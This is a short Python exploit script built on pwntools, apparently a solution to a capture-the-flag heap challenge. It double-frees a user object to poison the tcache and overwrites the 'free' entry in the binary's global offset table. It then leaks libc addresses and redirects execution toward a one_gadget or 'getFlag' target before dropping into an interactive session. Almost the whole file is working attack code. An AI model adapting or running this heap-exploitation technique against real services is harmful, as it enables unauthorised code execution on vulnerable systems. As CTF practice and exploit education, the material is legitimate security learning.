#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

gdbscript = """
    b *main
    c
"""

def conn():
    if args.LOCAL:
        if args.DEBUG:
            r = gdb.debug(exe.path, gdbscript=gdbscript)
        else:
            r = process([exe.path])
    else:
        r = remote("addr", 1337)

    return r

def create_admin(r):
	r.sendline(b"1")
	return r.clean()

def create_user(r, name):
	r.sendline(b"2")
	r.sendline(name.encode())
	return r.clean()

def delete_user(r):
    r.sendline(b"7")
    return r.clean()

def edit_user(r, name):
    r.sendline(b"4")
    r.sendline(name)
    return r.clean()

def print_user(r):
    r.sendline(b"5")
    r.recvuntil(b"name is ")
    return r.recvuntil(b"MENU")[:-5]

def main():

    from one_gadget import generate_one_gadget
    for offset in generate_one_gadget(libc.path):
        print(offset)

    r = conn()

    create_user(r, "test")
    delete_user(r)
    delete_user(r)
    edit_user(r, p64(exe.got['free']))
    create_user(r, "\n")    
    create_user(r, "\n")    
    print(hex(exe.sym['getFlag']))
    free = print_user(r)
    print(free)
    edit_user(r, p64(exe.address+ 324386)) 
    #print(delete_user(r))

    r.interactive()


if __name__ == "__main__":
    main()
